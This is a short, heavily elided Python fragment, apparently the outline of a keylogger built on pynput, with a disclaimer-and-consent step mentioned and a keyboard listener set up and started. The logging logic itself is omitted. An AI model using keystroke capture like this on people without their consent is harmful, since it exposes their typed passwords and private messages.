...
# It Defines the keylogger function
def keylogger(key):
...
# It Displays the disclaimer and gets user acceptance
...
# it will Set up the keylogger listener
listener = pynput.keyboard.Listener(on_press=keylogger)
listener.start()

# it will make Run the keylogger for the specified duration
